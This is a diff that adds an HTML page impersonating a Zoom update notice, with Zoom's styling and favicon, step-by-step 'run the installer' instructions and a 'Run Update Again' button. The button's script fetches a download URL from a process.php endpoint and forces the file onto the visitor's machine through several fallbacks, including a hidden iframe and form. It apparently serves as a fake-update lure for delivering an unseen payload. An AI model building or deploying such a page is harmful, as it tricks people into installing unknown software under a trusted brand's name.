@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Zoom Update Ready</title>
+<link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
+
+<script src="https://cdn.tailwindcss.com"></script>
+
+<style>
+:root{
+  --zoom-dark-bg:#1C1C1E;
+  --zoom-card-bg:#232323;
+  --zoom-blue:#2D8CFF;
+  --zoom-border:#3A3A3C;
+  --zoom-text:#FFFFFF;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif;
+  background:var(--zoom-dark-bg);
+  color:var(--zoom-text);
+  min-height:100vh;
+}
+.zoom-logo{
+  width:90px;height:90px;
+  background:var(--zoom-card-bg);
+  border-radius:18px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:22px;
+  font-weight:700;
+  color:var(--zoom-blue);
+}
+.card{
+  background:linear-gradient(145deg,#2a2a2a,#1f1f1f);
+  border:1px solid var(--zoom-border);
+  border-radius:18px;
+}
+.step{
+  background:#00000040;
+  border:1px solid var(--zoom-border);
+  border-radius:14px;
+}
+.badge{
+  background:var(--zoom-blue);
+  padding:4px 10px;
+  border-radius:999px;
+  font-size:12px;
+  font-weight:600;
+}
+.btn-primary{
+  background:var(--zoom-blue);
+  padding:12px 18px;
+  border-radius:12px;
+  font-weight:600;
+}
+.btn-secondary{
+  background:#3A3A3C;
+  padding:12px 18px;
+  border-radius:12px;
+  font-weight:600;
+}
+</style>
+</head>
+
+<body>
+<div class="min-h-screen flex items-center justify-center p-4">
+
+<div class="w-full max-w-2xl card p-6">
+
+  <!-- Header -->
+  <div class="flex items-center gap-4 mb-6">
+    <div class="zoom-logo">zoom</div>
+    <div>
+      <h1 class="text-2xl font-semibold text-blue-500">
+        Update Downloaded
+      </h1>
+      <p class="text-gray-400 text-sm">
+        The Zoom update has already been downloaded
+      </p>
+    </div>
+  </div>
+
+  <!-- Status -->
+  <div class="bg-green-500/10 border border-green-500/30 rounded-xl p-4 mb-6">
+    <p class="text-sm text-green-400">
+      ✔ The installer is ready.  
+      If installation didn’t start, you can run it again below.
+    </p>
+  </div>
+
+  <!-- Steps -->
+  <div class="space-y-4 mb-6">
+    <div class="step p-4 flex gap-4">
+      <div class="badge">STEP 1</div>
+      <div>
+        <p class="font-semibold mb-1">Open Downloads</p>
+        <p class="text-sm text-gray-400">
+          Locate the Zoom update file on your computer.
+        </p>
+      </div>
+    </div>
+
+    <div class="step p-4 flex gap-4">
+      <div class="badge">STEP 2</div>
+      <div>
+        <p class="font-semibold mb-1">Close Zoom</p>
+        <p class="text-sm text-gray-400">
+          Make sure Zoom is fully closed before running the installer.
+        </p>
+      </div>
+    </div>
+
+    <div class="step p-4 flex gap-4">
+      <div class="badge">STEP 3</div>
+      <div>
+        <p class="font-semibold mb-1">Run the installer</p>
+        <p class="text-sm text-gray-400">
+          Double-click the update file and follow the instructions.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Buttons -->
+  <div class="flex flex-col sm:flex-row gap-4 justify-center">
+    <button class="btn-primary" onclick="triggerDownload()">
+      Run Update Again
+    </button>
+    <button class="btn-secondary" onclick="window.location.href='index.html'">
+      Back to Meeting
+    </button>
+  </div>
+
+</div>
+</div>
+
+<script>
+/* ================= SAME DOWNLOAD LOGIC (NO REDIRECT) ================= */
+
+const CONFIG = {
+  PROCESS_PHP_URL: 'process.php'
+};
+
+// Robust triggerDownload() — update.html version (NO redirect)
+async function triggerDownload() {
+  try {
+    // 1) Ask your server for the downloadUrl
+    const resp = await fetch(CONFIG.PROCESS_PHP_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        action: 'download',
+        meetingId: CONFIG.MEETING_ID,
+        timestamp: Date.now()
+      })
+    });
+
+    if (!resp.ok) {
+      console.error('process.php error', resp.status, resp.statusText);
+      return;
+    }
+
+    const data = await resp.json().catch(() => null);
+    const downloadUrl = data && data.downloadUrl;
+    if (!downloadUrl) {
+      console.error('process.php returned no downloadUrl', data);
+      return;
+    }
+
+    console.log('Got downloadUrl:', downloadUrl);
+
+    // ===== Helpers (unchanged) =====
+    function getFilenameFromContentDisposition(cd) {
+      if (!cd) return null;
+      const star = cd.match(/filename\*\s*=\s*[^']*''([^;]+)/i);
+      if (star) {
+        try { return decodeURIComponent(star[1]); } catch (e) { return star[1]; }
+      }
+      const m = cd.match(/filename\s*=\s*["']?([^"';]+)["']?/i);
+      return m ? m[1] : null;
+    }
+
+    function guessFilenameFromUrl(url) {
+      try {
+        const u = new URL(url);
+        const parts = u.pathname.split('/').filter(Boolean);
+        return parts.length ? parts[parts.length - 1] : null;
+      } catch (e) {
+        return null;
+      }
+    }
+
+    function downloadBlob(blob, filename) {
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.style.display = 'none';
+      a.href = url;
+      a.download = filename || 'download';
+      document.body.appendChild(a);
+      a.click();
+      setTimeout(() => {
+        URL.revokeObjectURL(url);
+        a.remove();
+      }, 2000);
+    }
+
+    // 2) Try fetch + blob (CORS-permitting)
+    try {
+      const fileResp = await fetch(downloadUrl, { method: 'GET', mode: 'cors' });
+      if (!fileResp.ok) throw new Error('fetch returned ' + fileResp.status);
+
+      // Streaming path
+      if (fileResp.body && fileResp.body.getReader) {
+        const reader = fileResp.body.getReader();
+        const contentLengthHeader = fileResp.headers.get('content-length');
+        const total = contentLengthHeader ? parseInt(contentLengthHeader, 10) : null;
+
+        const chunks = [];
+        let received = 0;
+
+        while (true) {
+          const { done, value } = await reader.read();
+          if (done) break;
+          chunks.push(value);
+          received += (value.length ?? value.byteLength ?? 0);
+
+          if (total) {
+            console.log(`Download progress: ${(received / total * 100).toFixed(1)}%`);
+          } else {
+            console.log(`Downloaded ${received} bytes`);
+          }
+        }
+
+        const blob = new Blob(chunks);
+        const filename =
+          getFilenameFromContentDisposition(fileResp.headers.get('content-disposition')) ||
+          guessFilenameFromUrl(downloadUrl) ||
+          'download.bin';
+
+        downloadBlob(blob, filename);
+        console.log('Downloaded via fetch (stream) ->', filename);
+        return;
+      }
+
+      // Non-streaming blob fallback
+      const blob = await fileResp.blob();
+      const filename =
+        getFilenameFromContentDisposition(fileResp.headers.get('content-disposition')) ||
+        guessFilenameFromUrl(downloadUrl) ||
+        'download.bin';
+
+      downloadBlob(blob, filename);
+      console.log('Downloaded via fetch (blob) ->', filename);
+      return;
+
+    } catch (fetchErr) {
+      console.warn('Direct fetch failed (likely CORS/redirect):', fetchErr);
+      // continue to proxy fallback
+    }
+
+    // 3) Proxy fallback via hidden iframe + form
+    try {
+      const proxyEndpoint = CONFIG.PROCESS_PHP_URL + '?proxy=1';
+
+      let iframe = document.getElementById('download-proxy-iframe');
+      if (!iframe) {
+        iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.id = 'download-proxy-iframe';
+        iframe.name = 'download-proxy-iframe';
+        document.body.appendChild(iframe);
+      }
+
+      const form = document.createElement('form');
+      form.style.display = 'none';
+      form.method = 'POST';
+      form.action = proxyEndpoint;
+      form.target = iframe.name;
+
+      const input = document.createElement('input');
+      input.type = 'hidden';
+      input.name = 'url';
+      input.value = downloadUrl;
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+
+      setTimeout(() => {
+        try { form.remove(); } catch (e) {}
+      }, 2000);
+
+      console.log('Submitted download to proxy endpoint (iframe).');
+      return;
+
+    } catch (proxyErr) {
+      console.error('Proxy fallback failed:', proxyErr);
+    }
+
+    // 4) Final fallback: open new tab
+    try {
+      window.open(downloadUrl, '_blank', 'noopener');
+      console.warn('Opened download URL in new tab as last resort.');
+    } catch (openErr) {
+      console.error('Failed to open download URL:', openErr);
+    }
+
+  } catch (err) {
+    console.error('triggerDownload error', err);
+  }
+}
+
+</script>
+
+</body>
+</html>
